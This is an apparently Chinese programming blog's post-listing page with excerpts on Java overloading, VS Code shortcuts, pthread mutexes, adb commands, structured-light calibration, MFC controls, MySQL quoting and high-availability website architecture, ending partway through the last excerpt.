<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>Posts - 编程随想</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="Posts" />
<meta property="og:description" content="编程随想的博客" />
<meta property="og:type" content="website" />
<meta property="og:url" content="/posts/" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	
	<link rel="alternate" type="application/rss+xml" href="/posts/index.xml" title="编程随想">

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程随想" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程随想</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main list" role="main">
	<header class="main__header">
		<h1 class="main__title">Posts</h1>
	</header><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1f781a00cc28a27a3da3c7e8c69705f0/" rel="bookmark">
			什么叫java方法重载？
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		方法重载是指在一个类中定义多个同名的方法，但要求每个方法具有不同的参数的类型或参数的个数。调用重载方法时，Java编译器能通过检查调用的方法的参数类型和个数选择一个恰当的方法。方法重载通常用于创建完成一组任务相似但参数的类型或参数的个数不同的方法。 Java的方法重载，就是在类中可以创建多个方法，它们可以有相同的名字，但必须具有不同的参数，即或者是参数的个数不同，或者是参数的类型不同。调用方法时通过传递给它们的不同个数和类型的参数来决定具体使用哪个方法
参数列表:个数不同，数据类型不同，顺序不同 注:方法重载与修饰符和返回值类型无关， 与参数的名称无关，只与参数列表的个数，类型，顺序相关
与返回值类型无关:
public static int sum(int a,int b){ return a+b; } public static float sum(int a,int b){ return a+b; } 与参数名称无关：
public static int sum(int a,int b){ return a+b; } public static int sum(int c,int d){ return c+d; } 举例
/* 题目要求： 比较两个数据是否相等。 参数类型分别为两个byte类型，两个short类型，两个int类型，两个long类型， 并在main方法中进行测试。 */ public class DemoMethodOverloadSame { public static void main(String[] args) { byte a=10; byte b=20; System.out.println(isSame(a,b)); System.out.println(isSame(11,12)); System.out.println(isSame((short)11,(short)13)); System.out.println(isSame(10,10)); System.out.println(isSame(10L,20L)); } public static boolean isSame(byte a,byte b){ System.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/1f781a00cc28a27a3da3c7e8c69705f0/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8cb770ce2d22d90529ea40684c4a6f50/" rel="bookmark">
			Visual Studio Code-批量添加或删除注释行
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 小技巧一例，批量删除Visual Studio code或notepad++注解信息，便于读取有效代码或文本信息，具体操作如下：
Visual Studio Code批量删除注解行信息:
在VS Code中我们可以通过Ctrl+h快捷键调出替换界面，在替换查找界面输入空行对应的正则表达式^#.*并Alt+R选择对应正则表达式查找模式，批量全部替换为空即清除注解行信息，具体如下：
1.快速打开替换界面，在Find界面输入^#.*
2.Alt+R选择Use Regular Expression(Alt+R)即正则表达式模式：
3.选择Replace All(Ctrl+Alt+Enter)批量替换全部完成操作，截图如下：
如果前边有空格的，可以适当添加对应空格进行替换。
Visual Studio Code批量添加注解：
使用快捷键，默认如下，我们也可以在选项界面进行自定义：
批量注释: Ctrl+K,Ctrl+C
取消注释: Ctrl+K,Ctrl+U
notepad++批量删除注解行信息:
方法1：正则表达式：^#.*
方法2：图形化界面操作：
Notepad++批量添加注解行信息:
欢迎关注：小温研习社 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/cdfc6f00c9c80f9a2446e28951c101d0/" rel="bookmark">
			C语言多线程互斥锁
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		互斥锁是为了防止多个线程同时操作临界资源，下面看看用法：
# include &lt;stdio.h&gt; # include &lt;pthread.h&gt; pthread_mutex_t mute; int value = 0; void *fun(void *arg){ //上锁，函数是阻塞的 pthread_mutex_lock(&amp;mute); printf("now is %d and old value is %d \n",*((int *)arg), value); ++value; printf("now is %d and new value is %d \n",*((int *)arg), value); //解锁 pthread_mutex_unlock(&amp;mute); } int main(){ pthread_t threads[5]; int thread_id[5]; //创建锁，相当于new一个对象 pthread_mutex_init(&amp;mute, NULL); for(int i=0; i&lt;5; ++i){ thread_id[i] = i; pthread_create(&amp;threads[i], NULL, fun, (void *)&amp;thread_id[i]); } for(int i=0; i&lt;5; ++i) int rc = pthread_join(threads[i], NULL); //释放互斥锁 pthread_mutex_destroy(&amp;mute); return 0; } 运行结果：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/cdfc6f00c9c80f9a2446e28951c101d0/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0876d3bb1cfa900dfe1bd74faeafd9ad/" rel="bookmark">
			安装python 3.7 以及pycharm
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		安装python 3.7 以及pycharm 1.安装python3.71.1在python官网下载3.7版本1.1手动添加环境变量 2.安装pycharm2.1进入官网下载3.5版本2.2 安装2.3激活 1.安装python3.7 1.1在python官网下载3.7版本 （由于安装过程忘记截图了，所以部分图片来源于网上）
首先，选择Downloads进行下载
选择python的版本进行下载（注意：根据电脑是64位还是32位选择下载）
勾选“add python 3.7 to PATH”这样可以自动生成环境变量，选择“Customize installation”可以自定义安装。
全部勾选
安装成功
安装完成后，打开cmd（win+R），输入python，出现以下界面，表示安装成功
1.1手动添加环境变量 如果没有勾选环境变量，可以通过以下方式手动添加
1.右击此电脑（我的电脑）–&gt;属性–&gt;高级系统设置–&gt;环境变量
2.在系统变量Path中添加python的安装路径
2.安装pycharm 2.1进入官网下载3.5版本 官网地址http://www.jetbrains.com/pycharm/download/#section=windows，下载PyCharm安装包，根据自己电脑的操作系统进行选择
2.2 安装 2.3激活 安装成功后，打开软件
接着选择 Activate code（用激活码激活）
pycharm永久激活方法
创建新项目
创建一个python项目
一些在pycharm里会用到的快捷键
1、Ctrl + /：注释(取消注释)选择的行；
2、Ctrl+d：对光标所在行的代码进行复制。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4860a1efbe029706c0b7d591f0e2accb/" rel="bookmark">
			html&#43;css制作一个简易百度页面
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		图片请自行寻找
html页面
&lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;title&gt;百度一下，你就知道&lt;/title&gt; &lt;link rel="shortcut icon" href="https://www.baidu.com/favicon.ico" type="image/x-icon" /&gt; &lt;link rel="stylesheet" type="text/css" href="css/css1.css" /&gt; &lt;/head&gt; &lt;body&gt; &lt;div id="d1"&gt; &lt;div align="center"&gt; &lt;ul&gt; &lt;li&gt;&lt;a href="http://news.baidu.com/" class="s"&gt;新闻&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href="https://www.hao123.com/" class="s"&gt;hao123&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href="http://map.baidu.com/" class="s"&gt;地图&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href="http://v.baidu.com/" class="s"&gt;视频&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href="http://tieba.baidu.com/" class="s"&gt;贴吧&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href="http://xueshu.baidu.com/" class="s"&gt;学术&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href="https://passport.baidu.com/v2/?login&amp;tpl=mn&amp;u=http%3A%2F%2Fwww.baidu.com%2F&amp;sms=5" &gt;登录&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href="http://www.baidu.com/gaoji/preferences.html"&gt;设置&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;input type="button" value="更多产品"&gt;&lt;/li&gt; &lt;/ul&gt; &lt;/div&gt; &lt;/div&gt; &lt;div id="d2"&gt; &lt;a href="https://www.baidu.com/s?wd=%E4%BB%8A%E6%97%A5%E6%96%B0%E9%B2%9C%E4%BA%8B&amp;tn=SE_PclogoS_8whnvm25&amp;sa=ire_dl_gh_logo&amp;rsv_dl=igh_logo_pcs" id="a1"&gt; &lt;img src="https://www.baidu.com/img/baidu_resultlogo@2.png"&gt; &lt;/a&gt;&lt;br /&gt; &lt;form action="http://www.baidu.com/s"&gt; &lt;div&gt; &lt;input type="
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/4860a1efbe029706c0b7d591f0e2accb/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ee30a8138da14d381683310957dc61fd/" rel="bookmark">
			js生成二维码
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		import QRCode from '../utils/weapp-qrcode.js' rpxTopx(rpx){ const rate = wx.getSystemInfoSync().windowWidth / 750 return rate * rpx }, // 初始化 let qrcode = new QRCode('canvas', { text: "1", width: qrcodeWidth, height: qrcodeWidth, colorDark: "#000", colorLight: "white", correctLevel: QRCode.CorrectLevel.H }); // 绘制 qrcode.makeCode('text you want', url =&gt; { this.setData({ url: url }) }) 复制这个js 引用一下即可
//Core code comes from https://github.com/davidshimjs/qrcodejs var QRCode; (function () { /** * Get the type by string length * * @private * @param {String} sText * @param {Number} nCorrectLevel * @return {Number} type */ function _getTypeNumber(sText, nCorrectLevel) { var nType = 1; var length = _getUTF8Length(sText); for (var i = 0, len = QRCodeLimitLength.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ee30a8138da14d381683310957dc61fd/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e6b13aa8b15c231a7ddc25f2221a2723/" rel="bookmark">
			adb命令整理大全
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		adb是什么?：adb的全称为Android Debug Bridge，就是起到调试桥的作用。通过adb我们可以在Eclipse中方面通过DDMS来调试Android程序，说白了就是debug工具。adb的工作方式比较特殊，采用监听Socket TCP 5554等端口的方式让IDE和Qemu通讯，默认情况下adb会daemon相关的网络端口，所以当我们运行Eclipse时adb进程就会自动运行。
adb有什么用?：借助adb工具，我们可以管理设备或手机模拟器的状态。还可以进行很多手机操作，如安装软件、系统升级、运行shell命令等等。其实简而言说，adb就是连接Android手机与PC端的桥梁，可以让用户在电脑上对手机进行全面的操作!
常用命令: 1.显示当前运行的全部模拟器： adb devices
2.启动ADB adb start-server
3.停止ADB adb kill-server
4.安装应用程序： adb install -r [apk文件]
-l #锁定该程序-r #重新安装该程序，保存数据-s #安装在SD卡内，而不是设备内部存储
例:adb install --r D:\mm.apk
5.卸载应用程序： adb uninstall [packagename]
例:adb uninstall com.tencent.mm
-k #不删除程序运行所产生的数据和缓存目录(如软件的数据库文件)
例:adb uninstall -k com.tencent.mm
6. 讲手机设备中的文件copy到本地计算机： adb pull 设备目录 本地目录例:adb pull /sdcard/mm.txt D:\(讲内存卡根目录的txt文件copy到D盘根目录)
7.将本地计算机的文件copy到手机设备中 adb push 本地目录 手机设备目录例:adb push D:\mm.txt /sdcard
8.查看adb命令帮助信息： adb help
9.截屏例:adb shell screencap -p 截图文件路径
10.查看指定包名应用的数据库储存信息(包括储存的SQL语句)
例:adb shell dumpsys dbinfo[packagename]
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/e6b13aa8b15c231a7ddc25f2221a2723/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/52eaedbd30805324360123774d70a411/" rel="bookmark">
			Visual Studio Code单行和多行注释方法汇总
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		使用Django的三行代码为例：
一、单行注释：（注释第一行代码）
1、光标放在首字母之前，shift+#，取消同理。
2、光标放在第一行任意位置（句中句末都可以），ctrl+/，取消同理。
3、光标选中想要注释的某行代码，alt+shift+A，取消同理。
4、光标选中想要注释的某行代码，(1）ctrl+k（2）ctrl+c，取消是（1）ctrl+k（2）ctrl+u。
二、多行注释：（注释多行代码）
1、光标选中想要注释的所有代码，ctrl+/，取消同理。
2、光标选中想要注释的所有代码，alt+shift+a，取消同理。
3、光标选中想要注释的所有代码，(1）ctrl+k（2）ctrl+c，取消是（1）ctrl+k（2）ctrl+u。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9cb8785944386886e03358e452b2db45/" rel="bookmark">
			结构光三维重建
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		结构光三维重建之单目标定的一种方法——建立“相位-像点-真实三维坐标”之间的关系
1.了解标定的概念 在刚接触结构光三维扫描的时候，我虽然了解部分张正友标定的内容，但是对于标定还是感觉很模糊，经过最近几天的学习，我发现想掌握标定，首先应该把标定这两个字代表的意义弄懂。也就是要标定什么？
(1).对系统的标定
(2).对相机的标定
3.张正友标定的是相机参数 对于接触相机标定的小伙伴来说，张正友标定因为其易用性和准确性，始终是无法绕过的一个选项。那么我们就先来了解一下张正友标定。张氏标定的文章网上已经多得不能再多，具体的过程请自行下载论文张正友标定法英文原版论文。
。我们从目的倒着学习一下。相机标定的目的是得到相机内外参数和畸变参数，内部参数有焦距和像元尺寸的比值，主点以及倾斜角。外部参数就是旋转和平移矩阵。
外部参数就是旋转和平移矩阵。畸变参数有k1,k2,p1,p2,p3。
4.标定得到的相机参数和三维重建没有计算上的直接关系 调用过opencv进行标定的朋友应该发现，最终的结果是能够得到矫正畸变后的图片，但是对于单目结构光来说，或者更具体一点，对于单目结构光解出来的相位来说，不知道有什么用。这个时候，如果还是纠结于张世标定得到的几个参数矩阵的话，就会陷入怪圈，所以应该跳出来，想想别的思路。
这个时候对系统进行标定就要粉墨登场了，刚才我们讲了相机的标定，跟这个系统有什么关系呢？我们可以这么理解，相机是整个结构光三维扫描系统的一部分，我们只知道相机的参数，这对于把图像中的二维信息转化为三维是不够的，所以我们要对系统进行标定。
接下来就要理解所谓的“系统”是个什么概念。我举一个我之前适用一个白板获得参考相位进行重建的例子来方便理解，首先要知道这种方法是错误的。直接上图吧。
左图是一个白瓷瓶，右图是用错误的方式建立的点云。
看上去是不是点云要比真实的花瓶要“扁”，这是因为我没有进行标定，而是直接找了一个白板，进行一次投影光栅并解相位得到的“参考相位”。之后对花瓶进行投影解相得到“实际相位”，两个相位做差就是物体距离“参考面”的信息。但是！这个所谓的参考面是不存在的。见下图：
在这种情况下进行标定也不是不可以，但是要使用精密的测量仪器获得光心距离参考面的距离并直到扫描结束固定不动，而且 投影仪和相机要保持水平，成像面和参考面保持平行，光轴和参考面保持尽可能地垂直。 所以必须要精确已知l,d，这个代价太大，所以这种标定方法是不可取的。
5.一种灵活的单目标定方法 看到这里，相信你已经明白在三维重建中，标定不是得到一个内参矩阵和外参数RT那么简单了，内参以及RT是为了标定系统服务的，得到物体的深度信息才是我们的终极目的。
接下来的这种方法来自达飞鹏的《光栅投影三维精密测量》，主要思想如本文题目，建立“相位-像点-真实三维坐标”之间的关系。
在讲这种方法之前，我已经假设你对三大坐标系（世界坐标系、摄像机坐标系、图像坐标系）之间的关系已经理解了。
可以看到，还是有一个参考面，不是说不要参考面了吗？其实我们的目的正是要绕过参考面。再回忆一下，我们是要建立相位，像点和三维坐标之间的关系。我们分成两步：
第一步，建立（相位θ）-（摄像机坐标系下三维坐标Xc,Yc,Zc之间的关系） 通过上图，D''是D在参考面X轴上的投影点，平行于Y轴，P''是P'在X轴上的投影点，平行于Y轴，P'是实物点P在参考面上的投影点。由相似三角形关系：
联立上2式得
结合世界坐标变换至摄像机坐标公式：
其中a1~a8就是我们需要标定的系统数据。
第二部，建立（像点(m,n)）-（摄像机坐标系下三维坐标Xc,Yc,Zc之间的关系） 这步利用了摄像机的透视投影原理，需要用到内参矩阵。公式是：
以上两步，是利用投影得出的已知相位和已知相位所在点的三维坐标，来求a1~a8.有了a1~a8，再用扫描得到的相位，和XY坐标做透视投影刚体变换的逆变换，带入
就能得到深度信息Zc的值。
转载于:https://www.cnblogs.com/tansuoxinweilai/p/10471200.html
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/aa45c7012aacbfcf57daf03d8f8f8f47/" rel="bookmark">
			WPS显示无法创建对象，请确认对象已在系统注册表中注册
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		第一种方法：在系统的开始–所有程序找到WPS–WPS office工具–配置工具–高级–兼容设置，在这里勾选兼容第三方系统和软件。
第二种方法： xp/win7系统：拷贝packager.exe到系统目录如C:\windows\system32
第三种方法： 点击“开始-运行”，输入：regedit 进入注册表
1.HKEY_CURRENT_USER\Software\Kingsoft\Office 选中office，点击右键-删除
2.HKEY_LOCAL_MACHINE\SOFTWARE\kingsoft\Office 选中office，点击右键-删除
C:\Documents and Settings\Administrator\Application Data\Kingsoft\office6 将整个office6文件夹删除。
第二步：注册表以及路径清除干净后，点击“开始-所有程序-WPS office-wps office工具-卸载”。卸载的最后不要保留配置信息。
第三步：下载最新版本WPS完整程序（http://www.wps.cn/ ），换个路径重新安装一下程序
第一种方法就解决了~
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1ea95bc0824e9105ad47ad86ffc793e4/" rel="bookmark">
			mfc中，COMBOBOX如何获取输入的文本内容(转)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		简单的获取Combobox的选中内容是很简单的：
CString strChoosed;
m_mediaCombox.GetLBText(m_mediaCombox.GetCurSel(),strChoosed);
但是如何获取输入的文本呢：
m_mediaCombox.GetWindowsText(strChoosed); 不错就这么简单
转：http://my.csdn.net/ccf19881030/code/detail/25106
这是一篇不错的文章，关于Combobox
1、获取组合框控制句柄
添加成员变量comboboxCtr；或者
CComboBoxEx* comboboxCtr = (CComboBoxEx*)GetDlgItem(BOX_ID);
2、点击下拉框不显示下拉列表（问题）
对话框编辑器里，把列表往下拖长一点即可。
3、设置展开下拉列表、设置输入框只读、清空列表内容
CComboBoxEx* comboboxCtr = (CComboBoxEx*)GetDlgItem(BOX_ID);
comboboxCtr-&gt;ShowDropDown(TRUE);
comboboxCtr-&gt;GetEditCtrl()-&gt;SetReadOnly(TRUE);
comboboxCtr-&gt;ResetContent();
4、添加列表内容
CComboBoxEx* comboboxCtr = (CComboBoxEx*)GetDlgItem(BOX_ID);CString inputTxt("要插入的内容。");
COMBOBOXEXITEMW* insertItem = new COMBOBOXEXITEM();
insertItem-&gt;iImage = 0; //图标索引值
insertItem-&gt;iOverlay = 0;
insertItem-&gt;pszText = (LPWSTR)(LPCTSTR)inputTxt; //字符串内容
insertItem-&gt;mask = CBEIF_IMAGE|CBEIF_TEXT; //指定列表项图片或者文本方式
comboboxCtr-&gt;InsertItem(insertItem);
5、调用ShowDropDown()方法后不显示光标
因为编辑框改变的时候把光标改变成IDC_ICON。
ccomboboxVar.ShowDropDown(); SetCursor(LoadCursor(NULL,IDC_ARROW));
在调用 ShowDropDown()方法后加上置光标的语句。
6、如何设置组合框CComboBox里面的值、获取当前所选择组合框的值？
1、设置组合框CComboBox里面的值
2、获取当前所选择组合框的值
MFC的话，可以用CComboBox::GetLBText()等成员函数，API可以发送CB_GETLBTEXT消息，
(1)MFC
//获取用户选择的Combox控件的值
CString strChoosed;
m_mediaCombox.GetLBText(m_mediaCombox.GetCurSel(),strChoosed);
(2)API
API就是SendMessage，发CB_ADDSTRING、CB_INSERTSTRING、CB_GETLBTEXT消息。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/1ea95bc0824e9105ad47ad86ffc793e4/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/14dda90a232d5efeb9fb2824d967cf5d/" rel="bookmark">
			pycharm不以pytest方式运行，想要切换回普通模式运行的方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		有时候系统会以pytest的形式运行，如果不想以这种方式运行，换回普通模式，那么就点击画圈圈那里的白色三角行
点击Edit configurations
点击“-”
出现如下图，点击python
点击左上角的“+”，选择Python
查找你所需要执行的文件所在的目录
点击ok
在Name那里写文件名
点击右下角的ok
这时候再观察，发现没有pytest了
右键选run 运行程序
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/312b298dbccbc81068611862d30610c3/" rel="bookmark">
			MySql 里名称（数据表名、字段名）与 &#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;和`````````
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		MySql 里名称（数据表名、字段名）需要用``````````````````````这个符号括起来，而不是’‘’‘’‘’‘’‘’‘’‘’‘’‘’‘;
在php里，容易写成这样 "SELECT * FROM '数据表名' WHERE '字段名1' = '123' "。
这里数据表名与字段名1，要么是用`````````````````括起来，要么是不括。使用''''''''括起来，是错误的，可能把 '数据表名' 整体认为是表名。
既要么是："SELECT * FROM 数据表名 WHERE 字段名1 = '123' "
或者是："SELECT * FROM `数据表名` WHERE `字段名1` = '123' "
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8f8dc5a14499eaf3c84616de5faed057/" rel="bookmark">
			解析word公式的解决方案(office插入和wps插入不同的解决方案)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		这几天在公司的项目有个需求就是数学公式的导入,而对于word来说,插入的公式xml格式,需要转换为mathML,借用插件MathJax来进行展示,而对于wps插入的公式来说,获取到的是一个wmf图片,wmf是无法在页面上进行展示的,所以思路就是将wmf转换为png图片. 这个在网上的资料有很多,是先转换为svg,再转换为png,但是我在实际操作过程中发现很多问题,就是公式的一些特殊符号展示不出来,所以在这总结下解决办法,最后有两种解决方案,一个是硬编码,一个是借助 第三方来实现.
使用的是poi解析word
先说一下office插入的公式解决方案 思路就是读取出来的xml,先进行转换为mathML,然后直接在页面上展示就可以,直接代码实现:
// 进行转换的过程中需要借助这个文件,网上搜索就可以,或者使用everything这个软件全盘搜一下,一般来说本机安装office就会有这个文件,找到就可以 private static File stylesheet = new File("src/main/resources/OMML2MML.XSL"); private static TransformerFactory tFactory = TransformerFactory.newInstance(); private static StreamSource stylesource = new StreamSource(stylesheet); /** * 获取MathML * @param ctomath * @return * @throws Exception */ static String getMathML(CTOMath ctomath) throws Exception { Transformer transformer = tFactory.newTransformer(stylesource); Node node = ctomath.getDomNode(); DOMSource source = new DOMSource(node); StringWriter stringwriter = new StringWriter(); StreamResult result = new StreamResult(stringwriter); transformer.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/8f8dc5a14499eaf3c84616de5faed057/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/167f40e1c96a906265bf3a050dd5f2da/" rel="bookmark">
			Mybatis和JDBC的区别
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		JDBC是Java提供的一个操作数据库的API； MyBatis是一个持久层ORM框架，底层是对JDBC的封装。
MyBatis对JDBC操作数据库做了一系列的优化：
（1） mybatis使用已有的连接池管理，避免浪费资源，提高程序可靠性。
（2） mybatis提供插件自动生成DAO层代码，提高编码效率和准确性。
（3） mybatis 提供了一级和二级缓存，提高了程序性能。
（4） mybatis使用动态SQL语句，提高了SQL维护。（此优势是基于XML配置）
（5） mybatis对数据库操作结果进行自动映射
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1b9cdd9bca541d41a4bcdd07d45aa6c7/" rel="bookmark">
			网站的高可用架构
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		网站的可用性描述网站可有效访问的特性，相比于网站的其他非功能特性，网站的可用性更牵动人们的神经，大型网站的不可用事故直接影响公司形象和利益。
5.2高可用的网站架构 网站高可用架构设计的主要目的是保证服务器硬件故障时服务仍然可用、数据依然保存并能够访问。
实现上述高可用架构的主要手段是数据和服务的冗余备份及失效转移，一旦某些服务器宕机，就将服务切换到其他可用服务器上，如果磁盘损坏，则从备份磁盘读取。
一个典型的网站设计通常遵循下图的基本分层架构模型。
应用层，服务层，数据层各层之间具有相对独立性，应用层主要负责具体业务逻辑处理；服务层提供可复用的服务；数据层负责数据的存储于访问。中小型网站在具体部署时，通常将应用层和服务层部署在一起，数据层另外部署。
在复杂的大型网站架构中划分的粒度会更小，更详细，服务器规模更加庞大。
不同的业务产品会部署在不同的服务器集群上，如文库，贴吧等属于不同的产品，部署在各自独立的服务器集群上，互不相干。这些产品又会依赖一些共同的复用业务，如注册登录服务，Session服务，账户管理服务等，这些可复用的业务也各自部署在独立的服务器集群上。同理，数据层的服务也都部署在各自独立的服务器集群上。
位于应用层和服务层的服务器为了应对高并发的访问请求，会通过负载均衡加集群的方式实现高可用，当有服务不可用时，会立即通知客户端程序修改服务访问列表，剔除不可用的服务器。
位于数据层的服务器情况比较特殊，为了保证服务器宕机时数据不丢失，需要在数据写入时进行数据同步复制，将数据写入多台服务器上，实现数据冗余备份。
另外，网站升级的频率一般非常高，每次网站发布都需要关闭服务，重新部署系统，整个过程相当于服务器宕机。因此网站的可用性架构设计还要考虑网站升级发布引起的宕机。
5.3高可用的应用 5.3.1通过负载均衡进行无状态服务的失效转移 负载均衡，就是当单台服务器不足以承担所有的负载压力时，通过负载均衡手段，将流量和数据分摊到一个集群组成的多台服务器上，以提高整体的负载处理能力。在网站应用中，当集群服务时无状态对等时，负载均衡可以起到事实上高可用的作用。
当一台服务器宕机时，负载均衡服务器通过心跳检测机制发现该服务器失去响应，就会将它从服务器列表中删除，而降请求发送到其他服务器上。 5.3.2应用服务器集群的session管理 应用服务器的高可用架构设计主要基于服务无状态这一特性，但是事实上，业务总是有状态的，在交易类的电子商务网站，需要有购物车记录用户的购买信息，在社交类的网站中，需要记录用户的当前登录状态，好用状态等，用户每次刷新页面都需要更新这些信息。
Web应用中将这些多次请求修改使用的上下文对象称为会话（session）。单机情况下，session可以由部署在服务器上的web容器（如JBoss）管理。在使用负载均衡的集群环境中，由于负载均衡服务器可能会将请求分发到集群中任何一台应用服务器上，所以保证每次请求依然能够获得正确的Session比单机时复杂的多。
集群环境下，Session管理主要有以下手段：
1.Session复制
应用服务器开启Web容器的Session复制功能，在集群中的几台服务器之间同步Session对象，使得每台服务器上都保存所有用户的Session信息，这样一台机器的宕机都不会导致session数据的丢失。而服务器使用Session时，也只需在本机获取即可。
但是这种方案在集群规模较大时，集群服务器间需要大量的通信进行Session复制，占用服务器和网络的大量资源，系统不堪重负。而且由于所有用户的Session信息在每台服务器上都有备份，在大量用户访问的情况下，甚至会出现服务器内存不够Session使用的情况。
2.Session绑定
Session绑定可以利用Hash算法实现，负载均衡服务器总是将源于同一IP的请求分发到同一台服务器上（也可以根据Cookie信息将同一个用户的请求总是分发到一台服务器上）这样整个会话期间，用户所有的请求都在同一台服务器上处理，即Session绑定在某台特定服务器上。
但是Session绑定的方案显然不符合对系统高可用的需求，因为一旦某台服务器宕机，那么该机器上的Session也就不赋存在了。虽然大部分负载均衡服务器都提供源地址负载均衡算法，但很少有网站利用这个算法进行Session管理。
3.利用Cookie记录Session
早期的C/S架构，一种管理Session的方式是将Session记录在客户端，每次请求服务器的时候，将Session放在请求中发送给服务器，服务器处理完请求后再将修改过的Session响应给客户端。
网站没有客户端，但是可以利用浏览器支持的Cookie记录Session
利用Cookie记录Session也有一些缺点，比如受Cookie大小限制，能记录的信息有限；每次请求响应都需要传输Cookie，影响性能；如果用户关闭Cookie，访问就会不正常，但是由于Cookie的简单易用，可用性高，支持应用服务器的线性伸缩，而大部分应用需要记录的Session信息又比较小，因此事实上，许多网站都或多或少地使用Cookie记录Session。
4.Session服务器
利用独立部署的Session服务器（集群）统一管理Session，应用服务器每次读写Session时，都访问Session服务器。这种解决方案事实上是将应用服务器的状态分离，分为无状态的应用服务器和有状态的Session服务器。
对于有状态的Session服务器，一种比较简单的方法是利用分布式缓存、数据库等，在这些产品的基础上进行包装，使其符合Session的存储和访问要求。如果业务场景对Session管理有比较高的要求，比如利用Session服务继承单点登录，用户服务等功能，则需要开发专门的Session服务器管理平台。
5.4高可用的服务 1.分级管理
运维上将服务器进行分级管理，核心应用和服务优先使用更好的硬件。在服务部署上也进行必要的隔离，避免故障的连锁反应。优先级低的服务通过启动不同的线程或者部署在不同的虚拟机上进行隔离，而优先级高的服务则需要部署在不同的物理机上，核心服务和数据甚至需要部署在不同地域的数据中心。
2.超时设置
